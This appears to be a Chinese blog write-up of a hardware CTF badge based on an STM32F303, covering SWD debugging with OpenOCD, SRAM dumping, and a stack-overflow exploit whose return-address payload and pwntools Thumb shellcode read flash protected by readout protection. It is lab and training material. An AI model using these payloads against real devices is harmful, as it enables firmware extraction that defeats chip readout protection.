#  硬件安全研究员震惊！STM32漏洞利用实现任意代码执行全过程曝光   
原创 二进制磨剑  二进制磨剑   2025-06-04 00:31  
  
   
  
👆标题由我的赛博员工 GPT 震惊部生成👆  
  
  
最近收到朋友赠送的PANDA 2025 物理攻击与安全评测开发板，我用手头已有的设备对其进行了复现分析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtTNcr8ib5dRDBwPLmPRtGCA4bEDooR57O1JmMut1AmgGbicKgzrBjfseA/640?wx_fmt=png&from=appmsg "")  
  
  
材料：  
- • PANDA 2025 物理攻击与安全评测开发板  
  
- • DAP 调试器  
  
- • 若干杜邦线  
  
TIPS：PANDA 2025 物理攻击与安全评测开发板虽然可以直接用 stm32CubeProgrammer  
 调试，但我还是选择使用自己的 DAP SWD 调试器和 OpenOCD 来分析。  
  
通过 CPU 背部文字判断是 STM32F303  
  
串口连接，中文编码，gbk  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtibLWX2Kl9QDAfEZT3VXic9IlQzKM98wbExnLSNRl5m2ulgoTQ2VVDaUQ/640?wx_fmt=png&from=appmsg "")  
  
  
固件下载  
  
https://gitee.com/yichen115/badge  
## PC4 挑战  
  
这个挑战是读取 SRAM，准备试试 DAP 连接 SWD。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtibLWX2Kl9QDAfEZT3VXic9IlQzKM98wbExnLSNRl5m2ulgoTQ2VVDaUQ/640?wx_fmt=png&from=appmsg "")  
  
用 DAP 调试器连接，然后用 OpenOCD  
```
openocd -f ./tcl/interface/cmsis-dap.cfg -c "transport select swd" -f tcl/target/stm32f3x.cfg
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtiaGBqw6mKpq2fV6vt4b5wjbevMSHBia8icxJKNIz6tsMR3IsFAZH5ClCg/640?wx_fmt=png&from=appmsg "")  
  
其中 Info : SWD DPIDR 0x2ba01477  
 是一个很重要的信息，这个值用来标识芯片的 **调试接口类型**  
 和 **厂商/架构信息**  
，是 ARM 标准的一部分。  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">位段</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">位数</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">含义</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">当前值 (0x2ba01477)</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">DESIGNER</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">[31:24]</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">设计厂商代码（JEP106）</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0x2b</span></code></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">PARTNO</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">[23:20]</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Debug Port 类型（0b1010 = Cortex-M）</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0xa</span></code></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">MINOR</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">[19:16]</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">修订号（小版本）</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0x0</span></code></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">VERSION</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">[15:12]</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">修订号（大版本）</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0x1</span></code></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RES0</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">[11:0]</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">保留字段</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;padding: 0.5em 1em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: rgb(229, 229, 229);font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 14.4px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">0x477</span></code></td></tr></tbody></table>  
  
根据提示，使用 telnet 连接 4444  
```
telnet localhost 4444
```  
  
连接上后依次执行 init  
 和 targets  
 观察输出。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtQmq0BKQlNWzpFuhOqMEJcyaaiadtPocj2JKANwTg7Kw4aia96Hiblbtcg/640?wx_fmt=png&from=appmsg "")  
  
stm32f3 芯片提供了 3 个等级的读保护（read-out protection, RDP）。  
- • level 0 (no protection)  
  
- • level 1 (Flash memory, backup SRAM, and backup registers protected)  
  
- • level 2 (same as level 1, but with permanent protection by locking the option bytes)  
  
查阅了一些资料，RDP 等级信息存在 option bytes  
 内存，level 1 可修改 option bytes  
 并且擦除 flash 的形式回退，level 2 不可改 option bytes  
。  
  
options bytes  
 在哪里呢？datasheet 里面搜 options bytes  
，查出来是 0x1FFFF800  
```
> mdw 0x1FFFF8000x1ffff800: ffff44bb
```  
  
其中最低的字节 bb  
 就是 RDP Level，查找相关源码是 OB_RDP_Level_1  
。  
```
  * @brief  Read Protection Level    */ #define OB_RDP_Level_0   ((uint8_t)0xAA)#define OB_RDP_Level_1   ((uint8_t)0xBB)/*#define OB_RDP_Level_2   ((uint8_t)0xCC)*/ /* Warning: When enabling read protection level 2                                                 it's no more possible to go back to level 1 or 0 */
```  
  
也就是说，不能通过调试接口读取 flash，但是 SRAM 是可以读取的。  
  
接下来想使用 dump 把整个 sram dump 出来，然后搜索 flag 文本。  
  
经常搞逆向的朋友都知道，dump 肯定需要一个起始地址和大小，那么就来翻翻手册。  
  
搜索 stm32f303 的 datasheet 文档，在里面找到 SRAM 的内存布局，起始地址是 0x20000000  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtg3MhyQ6Tf7tPQX8u7VlFgfAoibbXjxicb56IwoYOa4079ibz48Ww8gYmA/640?wx_fmt=png&from=appmsg "")  
  
SRAM 区域的大小怎么确定呢？   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtANWUPfjSmvWgZA92dLYX7z7IqNSH5E4jS4gvo1KBnIXfpfsKHtZ5AQ/640?wx_fmt=png&from=appmsg "")  
  
datasheet 里面有 32,48 kb 两种，都试试。  
```
dump_image sram_dump.bin 0x20000000 32768
```  
  
dump 出来后使用 010 editor 搜索 flag。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtU5qPVNH1loJiaV8a1AP6ptFWqws06f7NAKIkwwgaayxLmiaEPVVp5ibag/640?wx_fmt=png&from=appmsg "")  
  
## PC5  
  
没有板子，玩不了。  
## PB0  
  
没有示波器玩不了。  
## PB1  
  
目标描述：通过 VUL 功能漏洞调用后门函数点亮该 LED。  
  
板子提供了固件，逆向分析固件里面的 VUL 函数。  
```
 void main() {    // .....    if ( !strcmp(cmd, "VUL") )    {      _2printf((constchar *)dword_8005444);      HAL_UART_Receive(&huart1, pData, 0x12Cu, 0xFFFFFFFF);      vulnerable_function(pData);    }}void __fastcall vulnerable_function(uint8_t *input){char buffer[10]; // [sp+0h] [bp-18h] BYREF  qmemcpy(buffer, input, 0x12Cu);}
```  
  
串口接收 VUL 字符串后，可以继续接收 300 字节的数据，函数 vulnerable_function  
 里面的 qmemcpy  
 从 input 内存复制 0x12C（300）字节到 buffer  
，然而 buffer  
 是栈内存且仅有 10 字节大小。  
  
点亮 LED 需要操作 GPIO，HAL_GPIO_WritePin  
 函数可以操作 GPIO，然后查找这个函数交叉引用的时候发现了后门函数 open_led_backdoor  
 ，这意味着不需要构造复杂的 ROP 来实现点亮 LED。  
```
void open_led_backdoor() // 800552C{  MEMORY[0x2000029A] = 1;  HAL_GPIO_WritePin(MEMORY[0x20000294], MEMORY[0x20000298], GPIO_PIN_SET);  save_led_state_to_flash();}
```  
  
这个函数的内存地址是 800552C  
，实际使用的使用需要将该地址 +1，即 800552D  
，thumb 模式。  
  
stm32 栈在哪里？SRAM 里面。  
  
在大多数 STM32 芯片中，**0x08000000（Flash 起始地址）处的前 4 字节就是初始化栈指针（MSP）**  
 ：  
```
0x08000000: <Initial Stack Pointer Value>0x08000004: <Reset Handler Address>
```  
  
IDA 里面定位过去  
```
ER_IROM1:08000000 __Vectors       DCD init_spER_IROM1:08000004                 DCD Reset_Handler+1ER_IROM1:08000008                 DCD NMI_Handler+1ER_IROM1:0800000C                 DCD HardFault_Handler+1
```  
  
继续定位init_sp  
```
abs:200009F8 ; ===========================================================================abs:200009F8abs:200009F8abs:200009F8 init_sp = 0                             ; DATA XREF: ER_IROM1:__Vectors↑oabs:200009F8                          
```  
  
很明显 200009F8  
 是一个 SRAM 里面的地址（见前面），后面要调试的时候，可以用 openocd dump 栈内存看看。  
  
构造一个 300 字节，全是后门函数地址的 payload 。  
```
" ".join(["%02X" % x for x in p32(0x800552D) * 75 ])
```  
  
打进去发现并不能成功，于是用一些测试数据 111122223333444455556666777788889999  
 打入内存看一下，然后用 openocd 来 dump 内存。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVt7dhedMl5LRWPU1gMJYllywpiaFTPsNgpoQrV67XTZibyTPbV3UUOsEpA/640?wx_fmt=png&from=appmsg "")  
  
  
直观看输出，整齐的 4 字节错位了1 个字节，POP LR 的内存肯定是 4 字节对齐的，所以需要重新用一些垃圾数据补齐一下，前面补充 3 字节数据就重新对齐了。  
  
VUL 0D 0A ，其实只会接收到 0D。  
  
构造如下 payload ，刚好 300 字节。  
```
61 61612D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D 5500082D
```  
  
此时可以点亮 PB1。  
## PB2  
  
绕过 STM32 读保护，在 Flash 地址 0x08030030 处读取 flag。  
  
rdp 是不会绕的，参考官方 wp，就算故障注入打成功了也读不出 Flash。  
  
利用上个挑战 PB1 的栈溢出，构造 shellcode，把 Flash 地址 0x08030030 的数据复制到 SRAM 内存。  
```
from pwn import *context.arch = 'thumb'shellcode = """LDR R0, =0x20000520LDR R1, =0x08030030MOV R2, #0x20LDR R3, =0x8000243BLX R3end:B end"""shellcode = asm(shellcode)shellcodebase = 0x20000000 + 0x891payload = b'A' * 3 + p32(shellcodebase) * 5 + shellcodepayload = payload.ljust(300, b'd')print(" ".join(f"{x:02x}" for x in payload))
```  
  
然后 dump sram 内存就可以了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FMiaMMfBpPgCdBaulnx77acPib49NJkXVtM6bBcIXQ76UeLyemsiaJSuPv6YWdkoianrj7jeOFwh7GPbSEaDLvR0FA/640?wx_fmt=png&from=appmsg "")  
  
# 总结  
  
本系列实验通过 DAP 调试、OpenOCD 工具、固件逆向和经典的嵌入式漏洞利用（如堆栈溢出、Thumb 指令集等）实现了在读保护芯片上的 SRAM 数据提取与 Flash 绕读。针对不同端口的攻防挑战，不仅涉及调试技巧，更融合了固件逆向与漏洞利用的实战思路，适合嵌入式安全和 CTF 爱好者参考。  
  
  
学习更多逆向技巧，请持续关注二进制磨剑公众号。  
  
  
   
  
  
